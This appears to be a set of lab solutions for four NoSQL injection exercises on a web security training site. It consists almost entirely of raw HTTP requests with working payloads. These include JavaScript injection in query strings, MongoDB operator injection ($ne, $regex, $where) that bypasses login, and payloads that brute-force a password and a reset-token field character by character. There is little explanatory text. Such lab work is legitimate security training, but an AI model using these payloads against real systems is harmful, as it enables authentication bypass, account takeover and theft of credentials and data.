## 1. Detecting NoSQL injection

`Accessories' || 1==1`

```
GET /filter?category=Accessories'%20%7c%7c%201%3d%3d1%00 HTTP/2
Host: 0a7f00d20456a54e8074719b00c300b2.web-security-academy.net
Cookie: session=RZMw7DtciEHGH0ZW5bxPDsM4pX5t8Shc
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i


```


## 2. Exploiting NoSQL operator injection to bypass authentication

```
POST /login HTTP/2
Host: 0a2800f30458a1a680e93fa3005c009f.web-security-academy.net
Cookie: session=vyXUmvA7mwVTaJUjaivYSf5bP3dLBK9Z
Content-Length: 60
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://0a2800f30458a1a680e93fa3005c009f.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a2800f30458a1a680e93fa3005c009f.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i

{"username": {"$regex":".{7}"}, "password":{"$ne": null} }
```


## 3. Exploiting NoSQL injection to extract data

`administrator' && this.password && this.password.match(/^tsinenso§p§.*$/)`

```
GET /user/lookup?user=administrator'%20%26%26%20this.password%20%26%26%20this.password.match(%2f%5etsinenso§p§.*%24%2f)%00 HTTP/2
Host: 0a8c0060033e43378049531e00da00cc.web-security-academy.net
Cookie: session=qjLuMLSNA2Fw4Hkc7iuHLeS0apzgXrMR
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a8c0060033e43378049531e00da00cc.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i


```


## 4. Exploiting NoSQL operator injection to extract unknown fields

```
POST /login HTTP/2
Host: 0a1400690449b47880f7716d007e00cd.web-security-academy.net
Cookie: session=y6sSfYyKBhtCNQPOuL5uUqZNMNE1q7G7
Content-Length: 61
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://0a1400690449b47880f7716d007e00cd.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a1400690449b47880f7716d007e00cd.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i

{"username":"carlos","password":{"$ne":"a"}, "$where":"1"}
```

```
POST /login HTTP/2
Host: 0a1400690449b47880f7716d007e00cd.web-security-academy.net
Cookie: session=y6sSfYyKBhtCNQPOuL5uUqZNMNE1q7G7
Content-Length: 94
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://0a1400690449b47880f7716d007e00cd.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a1400690449b47880f7716d007e00cd.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i

{"username":"carlos","password":{"$ne":"a"},"$where":"Object.keys(this)[2].match(`^.{0}§a§.*`)"}
```


```
POST /login HTTP/2
Host: 0a1400690449b47880f7716d007e00cd.web-security-academy.net
Cookie: session=y6sSfYyKBhtCNQPOuL5uUqZNMNE1q7G7
Content-Length: 94
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://0a1400690449b47880f7716d007e00cd.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a1400690449b47880f7716d007e00cd.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i

{"username":"carlos","password":{"$ne":"a"},"$where":"this.forgotPwd.match(`^774ac3fa24f186f5§§.*`)"}
```
